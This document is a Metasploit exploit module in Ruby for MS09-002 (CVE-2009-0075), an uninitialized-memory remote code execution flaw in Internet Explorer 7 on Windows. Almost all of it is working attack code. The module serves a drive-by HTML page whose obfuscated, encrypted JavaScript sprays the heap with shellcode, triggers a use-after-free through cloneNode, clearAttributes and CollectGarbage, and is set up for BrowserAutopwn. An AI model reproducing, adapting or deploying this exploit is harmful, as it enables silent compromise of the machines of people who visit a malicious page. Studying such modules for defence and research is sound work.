## 
#  $Id: ms09_002.rb,v 1.11 2011-03-22 14:41:40-03 nbrito Exp $
##

###########################################################################
#        ___________ _______    ________                                  #
#        \_   _____/ \      \  /  _____/     .__         .__              #
#         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             #
#         |        \/    |    \    \_\  \ /__    __/  /__    __/          #
#        /_______  /\____|__  /\______  /    |__|        |__|             #
#                \/         \/        \/                                  #
#                                                                         #
#                 Exploit Next Generation Methodology                     #
#                            Release 6.00                                 #
#                                                                         #
#                 Copyright (c) 2004-2011 Nelson Brito                    #
#                          All Rights Reserved                            #
#                                                                         #
###########################################################################
# Author: Nelson Brito <nbrito@sekure.org>                                #
#                                                                         #
# Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    #
###########################################################################
# ENG example is free software;  you  may  redistribute and/or  modify it #
# under the terms of the 'GNU General Public License' as published by the #
# Free  Software  Foundation;  Version  2  with  the  clarifications  and #
# exceptions described below.  This guarantees your right to use, modify, #
# and redistribute this software under certain conditions. If you wish to #
# embed ENG technology into  proprietary software,  please,  contact  the #
# author for an alternative license (contact nbrito@sekure.org).          #
#                                                                         #
# NOTICE: THIS EXPLOIT NEXT GENERATION EXAMPLE IS NOT DISTRIBUTED AS PART #
# OF ANY COMMERCIAL OR PUBLIC TOOL AND IS FREELY AVAILABLE. ALTHOUGH THIS #
# EXAMPLE WAS PORTED TO WORK WITH RAPID7 METASPLOIT FRAMEWORK TO SHOW HOW #
# FLEXIBLE ITS APPROACH AND DEPLOYMENT IS.                                #
#                                                                         #
# This  program  is distributed in the hope that it will  be useful,  but #
# WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    #
# Please, refer to GNU General Public License v2.0 for further details at #
# http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document #
# included with ENG.                                                      #
###########################################################################
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "7.0",
		:ua_maxver  => "7.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:vuln_test  => nil, # no way to test without just trying it
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MS09-002: Exploit Next Generation Methodology Example Module',
			'Description'    => 'Microsoft Internet Explorer Uninitialized Memory Remote Code Execution',
			'Author'         => [ 'Nelson Brito' ],
			'License'        => 'GPLv2',
			'Version'        => '$Revision: 1.11 $',
			'References'     =>
				[
					[ 'CVE', '2009-0075'],
					[ 'OSVDB', '51839' ],
					[ 'BID', '33627' ],
					[ 'MSB', 'MS09-002' ],
					[ 'URL', 'http://fnstenv.blogspot.com/' ],
					[ 'URL', 'http://www.h2hc.com.br/' ],
					[ 'URL', 'http://www.websecforum.com/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Microsoft Windows XP SP2-3, 2003 SP1, VISTA SP1 and 2008 SP1 + Internet Explorer 7',
						{
							'Rets'         => [ 0x05050505, 0x08080808,
									    0x10101010, 0x0c0c0c0c,
									    0x0d0d0d0d, 0x0e0e0e0e ],
							'HTMLElements' => [ 'frame',    'iframe',
									    'label',    'option',
									    'table',    'tbody' ],
							'SRCObjects'   => [ 'img',      'image',
									    'a',        'link' ],
							'OBJMethods'   => [ 'blur',     'click',
									    'focus' ],
							'HEAPSize'     => [ 256 ],
						},
					],
				],
			'DisclosureDate' => 'April 10th, 2011',
			'DefaultTarget'  => 0))

			@javascript_encode_key = rand_text_alpha(rand(10) + 10)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		if (!request.uri.match(/\?\w+/))
			send_local_redirect(cli, "?#{@javascript_encode_key}")
			return
		end

		return if ((p = regenerate_payload(cli)) == nil)

		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		vRet          = rand(target['Rets'].length)
		vHTMLElement  = rand(target['HTMLElements'].length)
		vSRCObject    = rand(target['SRCObjects'].length)
		vOBJMethod    = rand(target['OBJMethods'].length)
		case vSRCObject
			when 0
			when 1
				_N_B_R_I_T_O_ = "SRC"
			else
				_N_B_R_I_T_O_ = "HREF"
		end

		addr_jscript, crap_02 = [[target['Rets'][vRet]].pack('V').unpack('H*')[0][0,4]].map{|v| "%u#{v}" }

		vb00m         = rand_text_alpha(rand(10) + 10, payload_badchars)
		vFirstObject  = rand_text_alpha(rand(10) + 10, payload_badchars)
		vSecondObject = rand_text_alpha(rand(10) + 10, payload_badchars)
		vTriggerME    = rand_text_alpha(rand(10) + 10, payload_badchars)
		vunescape     = rand_text_alpha(rand(10) + 10, payload_badchars)
		vtheTrigger   = rand_text_alpha(rand(10) + 10, payload_badchars)
		vheapSize     = rand_text_alpha(rand(10) + 10, payload_badchars)
		vheapCode     = rand_text_alpha(rand(10) + 10, payload_badchars)
		vheapOffset   = rand_text_alpha(rand(10) + 10, payload_badchars)
		vtheExploit   = rand_text_alpha(rand(10) + 10, payload_badchars)
		vWeird        = rand_text_alpha_upper(24, payload_badchars)
		vtheTrigger   = rand_text_alpha(rand(10) + 10, payload_badchars)

		heapSpray     = rand_text_alpha(rand(10) + 10, payload_badchars)
		theSpray      = rand_text_alpha(rand(10) + 10, payload_badchars)
		_N            = rand_text_alpha(rand(10) + 10, payload_badchars)
		_B            = rand_text_alpha(rand(10) + 10, payload_badchars)
		_R            = rand_text_alpha(rand(10) + 10, payload_badchars)
		_I            = rand_text_alpha(rand(10) + 10, payload_badchars)
		_T            = rand_text_alpha(rand(10) + 10, payload_badchars)
		_O            = rand_text_alpha(rand(10) + 10, payload_badchars)
		heapSprayLib  = "eval(function(#{_N},#{_B},#{_R},#{_I},#{_T},#{_O}){#{_T}=function(#{_R}){return #{_R}.toString(36)};if(!''.replace(/^/,String)){while(#{_R}--){#{_O}[#{_R}.toString(#{_B})]=#{_I}[#{_R}]||#{_R}.toString(#{_B})}#{_I}=[function(#{_T}){return #{_O}[#{_T}]}];e=function(){return'\\\\w+'};#{_R}=1};while(#{_R}--){if(#{_I}[#{_R}]){#{_N}=#{_N}.replace(new RegExp('\\\\b'+e(#{_R})+'\\\\b','g'),#{_I}[#{_R}])}}return #{_N}}('e f(){}f.n=e(9,i,2){1.5=0,1.4,1.b,1.6,1.a,1.3;1.6=j;1.h=((1.6*8)*k);1.4=1.6+9.7;c{2+=2}d(2.7<1.4);1.a=2.g(0,1.4);1.3=2.g(0,(2.7-1.4));c{1.3+=(1.3+1.a)}d((1.3.7+1.4)<1.h);1.b=l m();c{1.b[1.5]+=1.3+9;1.5++}d(1.5<i)}',24,24,'|this|#{_N}|#{_B}|#{_R}|#{_I}|#{_T}|length||#{_O}|H|E|do|while|function|#{heapSpray}|substring|P|J|0x38|1024|new|Array|#{theSpray}'.split('|'),0,{}))"

		theJS = %Q|
		setTimeout('window.location.reload(true);', 3000);

		var #{vunescape}   = unescape;
		var #{vheapOffset} = #{vunescape}("#{addr_jscript}#{addr_jscript}");

		#{heapSprayLib};

		function #{vb00m}(){
			var #{vFirstObject} = document.createElement("#{target['HTMLElements'][vHTMLElement]}");
			#{vFirstObject}.#{target['OBJMethods'][vOBJMethod]};

			#{vSecondObject} = #{vFirstObject}.cloneNode();
			#{vFirstObject}.clearAttributes();
			#{vFirstObject} = null;

			CollectGarbage();

			var #{vtheTrigger} = document.createElement("#{target['SRCObjects'][vSRCObject]}");
			#{vtheTrigger}.#{_N_B_R_I_T_O_} = #{vheapOffset} + #{vunescape}("#{vWeird}");
			#{vSecondObject}.#{target['OBJMethods'][vOBJMethod]};
		}

		function #{vTriggerME}(){
			var #{vheapSize}   = #{target['HEAPSize']};
			var #{vheapCode}   = #{vunescape}("#{shellcode}");
				
			#{heapSpray}.#{theSpray}(#{vheapCode}, #{vheapSize}, #{vheapOffset});

			#{vb00m}();
		}|

		theJS = encrypt_js(theJS, @javascript_encode_key)

		theHTML = %Q|
		<html>
		<script type="text/javascript" language="javascript">
		#{theJS}
		</script>
		<body onload="window.setTimeout('#{vTriggerME}();', 800);"></body>
		</html>|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, theHTML)
		handler(cli)
	end
end
